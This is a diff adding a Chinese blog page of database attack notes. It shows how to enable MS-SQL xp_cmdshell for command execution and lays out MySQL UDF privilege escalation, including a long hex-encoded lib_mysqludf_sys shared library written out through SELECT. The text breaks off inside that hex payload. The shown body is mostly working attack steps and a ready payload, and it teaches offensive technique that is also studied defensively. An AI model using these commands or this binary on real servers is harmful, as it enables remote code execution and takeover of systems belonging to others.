@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang=zn>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="MS-SQL通过fscan扫描  得到密码，直接远程连接。 123SELECT * FROM sys.configurations WHERE name &#x3D; &#x27;xp_cmdshell&#x27;;  “存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库安全">
+<meta property="og:url" content="http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="h3x4&#39;s home">
+<meta property="og:description" content="MS-SQL通过fscan扫描  得到密码，直接远程连接。 123SELECT * FROM sys.configurations WHERE name &#x3D; &#x27;xp_cmdshell&#x27;;  “存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112353066.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112530738.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331140936528.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331135043052.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331143432623.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150827811.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150606441.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154025362.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154115150.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154503413.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195715024.png">
+<meta property="og:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195959109.png">
+<meta property="article:published_time" content="2025-03-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-31T14:32:17.065Z">
+<meta property="article:author" content="h3x4">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112353066.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>数据库安全</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+	  <link
+    rel="stylesheet"
+    href="https://unpkg.com/@waline/client@v3/dist/waline.css"
+  />
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2050/01/09/nihao/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/19/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&text=数据库安全"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&is_video=false&description=数据库安全"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=数据库安全&body=Check out this article: http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&name=数据库安全&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&t=数据库安全"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MS-SQL"><span class="toc-number">1.</span> <span class="toc-text">MS-SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89xp-cmdshell"><span class="toc-number">1.1.1.</span> <span class="toc-text">查看是否有xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">开启xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.3.</span> <span class="toc-text">RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">2.</span> <span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%EF%BC%9A3306"><span class="toc-number">2.1.</span> <span class="toc-text">默认端口：3306</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5-so%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">写入.so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.2.</span> <span class="toc-text">创建恶意函数执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4RCE"><span class="toc-number">2.2.3.</span> <span class="toc-text">执行命令RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REDIS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text">REDIS数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%EF%BC%9A6379"><span class="toc-number">3.2.</span> <span class="toc-text">端口：6379</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%86%99webshell"><span class="toc-number">3.3.1.</span> <span class="toc-text">1.写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%99%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.</span> <span class="toc-text">2.写反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.写ssh公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.3.4.</span> <span class="toc-text">4.主从复制</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+ 
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        数据库安全
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">h3x4</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-30T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-03-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS-SQL"></a>MS-SQL</h1><p>通过fscan扫描</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112353066.png" alt="image-20250331112353066"></p>
+<p>得到密码，直接远程连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>“存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。 而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的“xp_cmdshell脚本”，它可以执行操作系统的任何指令。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="查看是否有xp-cmdshell"><a href="#查看是否有xp-cmdshell" class="headerlink" title="查看是否有xp_cmdshell"></a>查看是否有xp_cmdshell</h3><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112530738.png" alt="image-20250331112530738"></p>
+<h3 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>master..xp_cmdshell ‘whoami’;</p>
+<p><strong><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331140936528.png" alt="image-20250331140936528"></strong></p>
+<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><h2 id="默认端口：3306"><a href="#默认端口：3306" class="headerlink" title="默认端口：3306"></a>默认端口：3306</h2><p>主要利用前提条件：</p>
+<ol>
+<li>有注入点</li>
+<li>root权限 （sqlmap里面的命令–is-dba参数查看结果）</li>
+<li>获取网站绝对路径<ul>
+<li>fuzz尝试</li>
+<li>构造错误参数</li>
+<li>phpinfo</li>
+<li>配置文件</li>
+<li>@@datadir参数</li>
+</ul>
+</li>
+<li>secure_file_priv&#x3D;<ul>
+<li>secure_file_prive&#x3D; ， 结果为空的话，表示允许任何文件读写</li>
+<li>secure_file_prive&#x3D;NULL， 表示不允许任何文件读写</li>
+<li>secure_file_prive&#x3D;‘某个路径’， 表示这个路径作为文件读写的路径</li>
+</ul>
+</li>
+<li>web目录具有写权限。</li>
+</ol>
+<p>连接时 </p>
+<blockquote>
+<p>注意点！！<strong>mysql-p -P 有区别 -P端口号</strong></p>
+</blockquote>
+<blockquote>
+<p> 如果想导入一个文件到这个绝对路径下：c:\windows\system32\wbem\mof\那么指定的时候绝对路径就需要输入成：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 或者 c:\windows\system32\wbem\mof\</p>
+</blockquote>
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><blockquote>
+<p>PS: secure_file_priv&#x3D;</p>
+<p>Mysql5.5版本前，参数值都是默认为空，允许读取</p>
+<p>Mysql5.6版本后 ,默认为NULL，无法用SQL语句对其进行修改。所以这种只能在配置进行修改。</p>
+</blockquote>
+<p>udf的动态链接库文件放到MYSQL的插件目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | /usr/local/mysql/lib/plugin/ |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>64位.so</p>
+<h3 id="写入-so文件"><a href="#写入-so文件" class="headerlink" title="写入.so文件"></a><strong>写入.so文件</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c6